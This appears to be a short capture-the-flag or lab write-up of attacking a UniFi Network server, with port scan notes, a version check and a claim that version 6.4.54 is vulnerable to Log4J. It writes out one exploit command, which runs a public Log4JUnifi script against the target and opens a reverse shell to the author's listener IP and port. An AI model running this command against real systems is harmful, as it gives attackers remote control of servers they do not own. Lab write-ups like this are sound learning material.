2022-07-06_18-32 12022-07-06_18-32 1## Ports

- `22`    ssh 
- `6789`   ibm-db2-admin?!
- `8080`    http-proxy 
- `8443`    ssl/nagios-nsca Nagios NSCA
- `8843`    ssl/unknown
- `8080`    cddbp-alt?


Lets explore 8080 (http proxy) to see if there is some kind of web server

![[Screenshot_2022-06-30_12-20-52 1.jpg]]

It appears we have some kind of login

## Version

We can see that it is running version `6.4.54`

A quick google search tells us that this version of unified is vulnerable to the Log4J exploit.



## Exploit

I found a handy github repo called Log4JUnifi

I ran the command `python3 exploit.py -u http://10.129.217.109:8080 -i 10.10.16.48 -p 4444`


![[2022-07-06_18-32 1.png]]


and ive now got a shell

![[2022-07-06_18-34.png]]